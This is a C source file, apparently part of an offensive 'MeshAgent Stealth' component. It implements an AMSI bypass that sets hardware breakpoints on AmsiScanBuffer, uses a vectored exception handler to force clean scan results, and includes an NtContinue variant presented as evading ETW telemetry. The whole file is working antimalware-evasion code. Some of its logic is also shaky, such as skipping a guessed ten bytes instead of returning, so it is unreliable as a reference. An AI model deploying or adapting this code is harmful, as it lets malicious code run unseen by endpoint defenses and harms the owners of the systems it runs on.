/*
 * MeshAgent Stealth - Hardware Breakpoint AMSI Bypass
 *
 * This uses hardware breakpoints (DR0-DR7 registers) instead of memory patching
 * to bypass AMSI. This method:
 * - Does NOT modify amsi.dll in memory (no ETW events)
 * - Maintains DLL integrity (passes integrity checks)
 * - Uses vectored exception handler (VEH)
 * - Bypasses kernel-level ETW telemetry
 *
 * Based on research from:
 * - https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/
 * - github.com/vxCrypt0r/AMSI_VEH
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "stealth.h"

// ================================================================
// Globals
// ================================================================

static PVOID g_VehHandle = NULL;
static PVOID g_AmsiScanBufferAddress = NULL;
static BOOL g_AmsiBypassActive = FALSE;

// ================================================================
// Vectored Exception Handler
// ================================================================

LONG WINAPI AmsiHardwareBreakpointHandler(PEXCEPTION_POINTERS pExceptionInfo)
{
    if (!pExceptionInfo || !pExceptionInfo->ExceptionRecord)
    {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Check if this is a single-step exception (hardware breakpoint)
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        // Check if we hit our AmsiScanBuffer breakpoint
        #ifdef _WIN64
        DWORD64 rip = pExceptionInfo->ContextRecord->Rip;
        #else
        DWORD rip = pExceptionInfo->ContextRecord->Eip;
        #endif

        if ((PVOID)rip == g_AmsiScanBufferAddress)
        {
            // We hit AmsiScanBuffer!
            // Modify return value to make it return S_OK (clean scan)

            #ifdef _WIN64
            pExceptionInfo->ContextRecord->Rax = S_OK;  // Return value

            // Skip the entire function by jumping to the return
            // Find the RET instruction (we'll just skip ~10 bytes as approximation)
            pExceptionInfo->ContextRecord->Rip += 10;
            #else
            pExceptionInfo->ContextRecord->Eax = S_OK;
            pExceptionInfo->ContextRecord->Eip += 10;
            #endif

            // Re-enable the hardware breakpoint for next call
            pExceptionInfo->ContextRecord->Dr7 |= 0x00000001;  // Enable DR0

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// ================================================================
// Set Hardware Breakpoint on Thread
// ================================================================

BOOL SetHardwareBreakpointOnThread(HANDLE hThread, PVOID address)
{
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current thread context
    if (!GetThreadContext(hThread, &ctx))
    {
        return FALSE;
    }

    // Set hardware breakpoint
    ctx.Dr0 = (DWORD_PTR)address;    // DR0 = address to break on

    // Configure DR7 (debug control register)
    ctx.Dr7 = 0;
    ctx.Dr7 |= (1 << 0);            // Enable DR0 (bit 0 = 1)
    ctx.Dr7 |= (0 << 16);           // DR0 breaks on execution (bits 16-17 = 00)
    ctx.Dr7 |= (0 << 18);           // DR0 size = 1 byte (bits 18-19 = 00)

    // Set modified context
    if (!SetThreadContext(hThread, &ctx))
    {
        return FALSE;
    }

    return TRUE;
}

// ================================================================
// Apply Hardware Breakpoint to All Threads
// ================================================================

BOOL SetHardwareBreakpointAllThreads(PVOID address)
{
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    DWORD currentProcessId = GetCurrentProcessId();
    DWORD currentThreadId = GetCurrentThreadId();
    int threadsPatched = 0;

    // Take snapshot of all threads
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    // Enumerate all threads
    if (Thread32First(hSnapshot, &te32))
    {
        do
        {
            // Only process threads belonging to current process
            if (te32.th32OwnerProcessID == currentProcessId)
            {
                // Skip current thread (will be handled separately)
                if (te32.th32ThreadID == currentThreadId)
                {
                    continue;
                }

                // Open thread
                HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                                           FALSE, te32.th32ThreadID);
                if (hThread)
                {
                    if (SetHardwareBreakpointOnThread(hThread, address))
                    {
                        threadsPatched++;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);

    // Also patch current thread
    HANDLE hCurrentThread = GetCurrentThread();
    if (SetHardwareBreakpointOnThread(hCurrentThread, address))
    {
        threadsPatched++;
    }

    return (threadsPatched > 0);
}

// ================================================================
// Main AMSI Bypass Function (Hardware Breakpoint Method)
// ================================================================

BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
{
    HMODULE hAmsi = NULL;

    if (g_AmsiBypassActive)
    {
        return TRUE;  // Already active
    }

    // Load amsi.dll
    hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi)
    {
        // AMSI not loaded - bypass not needed
        return TRUE;
    }

    // Get AmsiScanBuffer address
    g_AmsiScanBufferAddress = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_AmsiScanBufferAddress)
    {
        FreeLibrary(hAmsi);
        return FALSE;
    }

    // Register vectored exception handler (FIRST in chain)
    g_VehHandle = AddVectoredExceptionHandler(1, AmsiHardwareBreakpointHandler);
    if (!g_VehHandle)
    {
        FreeLibrary(hAmsi);
        return FALSE;
    }

    // Set hardware breakpoint on AmsiScanBuffer for all threads
    if (!SetHardwareBreakpointAllThreads(g_AmsiScanBufferAddress))
    {
        RemoveVectoredExceptionHandler(g_VehHandle);
        g_VehHandle = NULL;
        FreeLibrary(hAmsi);
        return FALSE;
    }

    g_AmsiBypassActive = TRUE;

    // Keep amsi.dll loaded (don't FreeLibrary)
    return TRUE;
}

// ================================================================
// Cleanup
// ================================================================

VOID Stealth_CleanupAMSIBypass(void)
{
    if (g_VehHandle)
    {
        RemoveVectoredExceptionHandler(g_VehHandle);
        g_VehHandle = NULL;
    }

    g_AmsiBypassActive = FALSE;
}

// ================================================================
// Alternative: NtContinue Method (Bypasses ETW TI)
// ================================================================

typedef NTSTATUS (NTAPI *NtContinue_t)(
    PCONTEXT Context,
    BOOLEAN RaiseAlert
);

BOOL Stealth_PatchAMSI_NtContinue(void)
{
    /*
     * Advanced method using NtContinue instead of SetThreadContext
     * This bypasses ETW TI (Threat Intelligence) events
     *
     * NtContinue updates thread context including debug registers
     * WITHOUT triggering EtwTiLogSetContextThread in kernel
     */

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
    {
        return FALSE;
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
    if (!pNtContinue)
    {
        return FALSE;
    }

    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi)
    {
        return TRUE;  // Not loaded
    }

    g_AmsiScanBufferAddress = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_AmsiScanBufferAddress)
    {
        return FALSE;
    }

    // Register VEH
    g_VehHandle = AddVectoredExceptionHandler(1, AmsiHardwareBreakpointHandler);
    if (!g_VehHandle)
    {
        return FALSE;
    }

    // Get current context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;

    // We can't easily call RtlCaptureContext from here, so use GetThreadContext
    HANDLE hCurrentThread = GetCurrentThread();
    if (!GetThreadContext(hCurrentThread, &ctx))
    {
        RemoveVectoredExceptionHandler(g_VehHandle);
        return FALSE;
    }

    // Set hardware breakpoint
    ctx.Dr0 = (DWORD_PTR)g_AmsiScanBufferAddress;
    ctx.Dr7 = 0x00000001;  // Enable DR0

    // Use NtContinue to apply the context (bypasses ETW TI)
    NTSTATUS status = pNtContinue(&ctx, FALSE);

    if (NT_SUCCESS(status))
    {
        g_AmsiBypassActive = TRUE;
        return TRUE;
    }

    RemoveVectoredExceptionHandler(g_VehHandle);
    g_VehHandle = NULL;
    return FALSE;
}
